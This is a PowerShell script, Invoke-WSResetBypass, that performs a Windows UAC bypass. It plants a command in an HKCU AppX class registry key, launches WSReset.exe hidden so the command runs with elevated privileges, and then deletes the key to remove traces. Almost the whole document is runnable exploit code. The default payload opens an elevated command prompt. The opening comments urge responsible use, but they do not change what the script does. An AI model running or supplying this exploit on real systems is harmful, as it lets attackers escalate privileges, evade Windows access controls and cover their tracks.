# This script appears to modify registry entries and execute commands.
# It's important to use such scripts responsibly and in alignment with security policies.

# Define the command to be executed. Default is opening a command prompt.
function Invoke-WSResetBypass {
    Param (
        [String]$Command = "C:\Windows\System32\cmd.exe /c start cmd.exe"
    )

    # Specify the path to the registry entry to be created or modified.
    $CommandPath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
    $filePath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"

    # Create the registry entry for the command.
    New-Item $CommandPath -Force | Out-Null
    New-ItemProperty -Path $CommandPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $CommandPath -Name "(default)" -Value $Command -Force -ErrorAction SilentlyContinue | Out-Null
    Write-Host "[+] Registry entry has been created successfully!"

    # Start the WSReset.exe process.
    $Process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden
    Write-Host "[+] Starting WSReset.exe"

    # Introduce a delay to allow time for the WSReset.exe process to execute.
    Write-Host "[+] Triggering payload.."
    Start-Sleep -Seconds 300

    # Check if the registry entry file path exists and remove it.
    if (Test-Path $filePath) {
        Remove-Item $filePath -Recurse -Force
        Write-Host "[+] Cleaning up registry entry"
    }
}

# Call the function to execute the defined actions.
Invoke-WSResetBypass
